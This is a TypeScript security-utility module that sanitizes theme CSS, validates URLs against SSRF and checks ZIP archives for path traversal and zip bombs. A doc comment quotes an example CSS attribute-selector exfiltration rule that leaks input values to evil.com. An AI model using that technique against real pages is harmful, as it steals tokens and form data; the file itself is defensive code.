import { URL } from 'node:url'

/**
 * Sanitizes theme CSS before it's stored and injected into every public page's <head>
 * (see server/plugins/theme-resolver.ts). Theme CSS is purely declarative styling —
 * colors, spacing, typography via CSS custom properties — and never legitimately needs
 * to load external resources (fonts/images are handled through dedicated site settings,
 * not theme CSS). So `url()` and `@import` are stripped entirely rather than allow-listed.
 *
 * This closes the CSS attribute-selector exfiltration technique — e.g.
 * `input[value^="a"] { background: url(https://evil.com/?leak=a) }`, which can leak DOM
 * attribute values (tokens, form state) character-by-character to an attacker's server
 * purely from CSS matching, no JavaScript required — plus @import-based external
 * stylesheet loading and the legacy IE `expression()` code-execution vector.
 */
export function sanitizeThemeCss(css: string): string {
  let out = css
  // Strip comments first so a payload can't hide/split a dangerous construct across
  // one (e.g. "@im/* */port").
  out = out.replace(/\/\*[\s\S]*?\*\//g, '')
  // Strip @import (external stylesheet loading). Matches through the first semicolon;
  // over-consuming on malformed input (missing semicolon) fails closed, not open.
  out = out.replace(/@import\b[^;]*;?/gi, '')
  // Strip url(...) entirely everywhere it appears.
  out = out.replace(/url\s*\([^)]*\)/gi, 'none')
  // Strip legacy IE CSS expression() (arbitrary script execution in old IE).
  out = out.replace(/\bexpression\s*\([^)]*\)/gi, 'none')
  // Prevent breaking out of the <style> block it's injected into.
  out = out.replace(/<\/style>/gi, '')
  return out
}

function isPrivateIPv4(host: string): boolean {
  // Check if standard dot-decimal IPv4 representation
  if (!/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(host)) return false
  const parts = host.split('.').map(p => Number.parseInt(p, 10))
  if (parts.some(p => Number.isNaN(p) || p < 0 || p > 255)) return false
  const o1 = parts[0] ?? 0
  const o2 = parts[1] ?? 0
  return (
    o1 === 10 || // 10.0.0.0/8
    o1 === 127 || // 127.0.0.0/8 (loopback)
    o1 === 0 || // 0.0.0.0/8 (broadcast/local)
    (o1 === 172 && o2 >= 16 && o2 <= 31) || // 172.16.0.0/12
    (o1 === 192 && o2 === 168) || // 192.168.0.0/16
    (o1 === 169 && o2 === 254) // 169.254.0.0/16 (link-local)
  )
}

function isPrivateIPv6(host: string): boolean {
  // Strip outer brackets if present
  const clean = host.startsWith('[') && host.endsWith(']') ? host.slice(1, -1) : host
  const lower = clean.toLowerCase()

  // Loopback / Unspecified
  if (lower === '::1' || lower === '::' || lower === '0:0:0:0:0:0:0:1' || lower === '0:0:0:0:0:0:0:0') {
    return true
  }

  // IPv4-mapped IPv6 (e.g. ::ffff:127.0.0.1 or ::ffff:7f00:1)
  if (lower.includes(':ffff:')) {
    const suffix = lower.split(':ffff:').pop() ?? ''
    if (suffix.includes('.')) {
      if (isPrivateIPv4(suffix)) return true
    } else {
      // Hex representation of IPv4-mapped IPv6
      const parts = suffix.split(':')
      if (parts.length === 2) {
        const w1 = Number.parseInt(parts[0] || '0', 16)
        const w2 = Number.parseInt(parts[1] || '0', 16)
        if (!Number.isNaN(w1) && !Number.isNaN(w2)) {
          const o1 = (w1 >> 8) & 0xFF
          const o2 = w1 & 0xFF
          const o3 = (w2 >> 8) & 0xFF
          const o4 = w2 & 0xFF
          const ipv4Str = `${o1}.${o2}.${o3}.${o4}`
          if (isPrivateIPv4(ipv4Str)) return true
        }
      }
    }
  }

  // Unique Local Addresses (fc00::/7) or Link-local (fe80::/10)
  if (
    lower.startsWith('fc') ||
    lower.startsWith('fd') ||
    lower.startsWith('fe8') ||
    lower.startsWith('fe9') ||
    lower.startsWith('fea') ||
    lower.startsWith('feb')
  ) {
    return true
  }

  return false
}

/**
 * Validates a URL for SSRF prevention.
 * Ensures the protocol is strictly HTTP/HTTPS and host is not loopback, private, or local.
 */
export function isSafeUrl(urlStr: string): boolean {
  try {
    const url = new URL(urlStr)
    if (url.protocol !== 'http:' && url.protocol !== 'https:') return false

    const host = url.hostname.toLowerCase()

    // Block local hostnames
    if (host === 'localhost') return false

    // Block local domain endings
    if (host.endsWith('.local') || host.endsWith('.internal')) return false

    // Block private IPv4
    if (isPrivateIPv4(host)) return false

    // Block private IPv6
    if (isPrivateIPv6(host)) return false

    return true
  } catch {
    return false
  }
}

/**
 * Parses the Central Directory of a ZIP archive in memory (without decompressing the files)
 * to validate file path traversals (Zip Slip) and total uncompressed size (Zip Bomb).
 */
export function validateZipArchive(
  data: Uint8Array,
  maxUncompressedSize: number
): { fileCount: number; totalSize: number } {
  const len = data.length

  // 1. Search for End of Central Directory (EOCD) signature (0x06054b50) from the end
  let eocdOffset = -1
  for (let i = len - 22; i >= Math.max(0, len - 65535 - 22); i--) {
    if (
      data[i] === 0x50 &&
      data[i + 1] === 0x4B &&
      data[i + 2] === 0x05 &&
      data[i + 3] === 0x06
    ) {
      eocdOffset = i
      break
    }
  }

  if (eocdOffset === -1) {
    throw createError({
      statusCode: 400,
      message: 'Invalid zip file: EOCD record not found',
    })
  }

  const view = new DataView(data.buffer, data.byteOffset, data.byteLength)

  // Total number of central directory records
  const totalRecords = view.getUint16(eocdOffset + 10, true)
  // Size of central directory
  const cdSize = view.getUint32(eocdOffset + 12, true)
  // Offset of central directory
  const cdOffset = view.getUint32(eocdOffset + 16, true)

  if (cdOffset + cdSize > len) {
    throw createError({
      statusCode: 400,
      message: 'Invalid zip file: central directory out of bounds',
    })
  }

  let currentOffset = cdOffset
  let totalUncompressedSize = 0
  let fileCount = 0

  // 2. Iterate through each Central Directory entry
  for (let r = 0; r < totalRecords; r++) {
    if (currentOffset + 46 > len) {
      throw createError({
        statusCode: 400,
        message: 'Invalid zip file: truncated central directory header',
      })
    }

    const sig = view.getUint32(currentOffset, true)
    if (sig !== 0x02014B50) {
      throw createError({
        statusCode: 400,
        message: `Invalid zip file: incorrect central directory signature at offset ${currentOffset}`,
      })
    }

    const uncompressedSize = view.getUint32(currentOffset + 24, true)
    const nameLen = view.getUint16(currentOffset + 28, true)
    const extraLen = view.getUint16(currentOffset + 30, true)
    const commentLen = view.getUint16(currentOffset + 32, true)

    const recordSize = 46 + nameLen + extraLen + commentLen
    if (currentOffset + recordSize > len) {
      throw createError({
        statusCode: 400,
        message: 'Invalid zip file: central directory record out of bounds',
      })
    }

    // Extract filename and check for path traversal
    const fileNameBytes = data.subarray(currentOffset + 46, currentOffset + 46 + nameLen)
    const fileName = new TextDecoder().decode(fileNameBytes).replace(/\\/g, '/')

    if (
      fileName.includes('..') ||
      fileName.startsWith('/') ||
      fileName.startsWith('\\') ||
      /^[a-z]:/i.test(fileName) // Block Windows drive letters (e.g. C:)
    ) {
      throw createError({
        statusCode: 400,
        message: `Directory traversal detected in zip entry: ${fileName}`,
      })
    }

    totalUncompressedSize += uncompressedSize
    fileCount++

    if (totalUncompressedSize > maxUncompressedSize) {
      throw createError({
        statusCode: 413,
        message: `Decompression limit exceeded: total uncompressed size exceeds ${Math.floor(
          maxUncompressedSize / (1024 * 1024)
        )} MB`,
      })
    }

    currentOffset += recordSize
  }

  return { fileCount, totalSize: totalUncompressedSize }
}
